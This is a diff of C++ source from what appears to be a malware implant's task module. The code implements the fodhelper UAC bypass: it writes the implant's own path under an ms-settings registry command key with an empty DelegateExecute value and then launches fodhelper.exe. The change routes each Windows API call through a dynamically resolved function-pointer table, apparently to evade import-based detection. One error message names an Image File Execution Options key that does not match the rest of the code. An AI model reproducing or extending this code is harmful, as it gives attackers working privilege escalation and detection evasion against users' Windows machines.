@@ -6,7 +6,7 @@ namespace Task
     {
         // Get current program (implant) path.
         WCHAR wSelfPath[MAX_PATH];
-        DWORD dwResult = GetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
+        DWORD dwResult = pState->pProcs->lpGetModuleFileNameW(NULL, wSelfPath, MAX_PATH);
         if (dwResult == 0)
         {
             return L"Error: Failed to get the program path.";
@@ -24,7 +24,7 @@ namespace Task
             LPCWSTR lpCmd = wCmd.c_str();
             const WCHAR* wDel = L"";
 
-            if (RegCreateKeyExW(
+            if (pState->pProcs->lpRegCreateKeyExW(
                 HKEY_CURRENT_USER,
                 wSubKey.c_str(),
                 0,
@@ -39,7 +39,7 @@ namespace Task
                 return L"Error: Failed to create key: Image File Execution Options\\notepad.exe.";
             }
 
-            if (RegSetValueExW(
+            if (pState->pProcs->lpRegSetValueExW(
                 hKey,
                 L"",
                 0,
@@ -48,11 +48,11 @@ namespace Task
                 (wcslen(lpCmd) + 1) * sizeof(WCHAR)
             ) != ERROR_SUCCESS)
             {
-                RegCloseKey(hKey);
+                pState->pProcs->lpRegCloseKey(hKey);
                 return L"Error: Failed to set default value for ms-settings command.";
             }
 
-            if (RegSetValueExW(
+            if (pState->pProcs->lpRegSetValueExW(
                 hKey,
                 L"DelegateExecute",
                 0,
@@ -61,11 +61,11 @@ namespace Task
                 (wcslen(wDel) + 1) * sizeof(WCHAR)
             ) != ERROR_SUCCESS)
             {
-                RegCloseKey(hKey);
+                pState->pProcs->lpRegCloseKey(hKey);
                 return L"Error: Failed to set 'DelegateExecute' value for ms-settings command.";
             }
 
-            RegCloseKey(hKey);
+            pState->pProcs->lpRegCloseKey(hKey);
 
             // Start the fodhelper.exe
             SHELLEXECUTEINFO sei = {sizeof(sei)};
@@ -74,7 +74,7 @@ namespace Task
             sei.hwnd = nullptr;
             sei.nShow = SW_NORMAL;
 
-            if (!ShellExecuteEx(&sei))
+            if (!pState->pProcs->lpShellExecuteExW(&sei))
             {
                 return L"Error: Failed to execute shell.";
             }
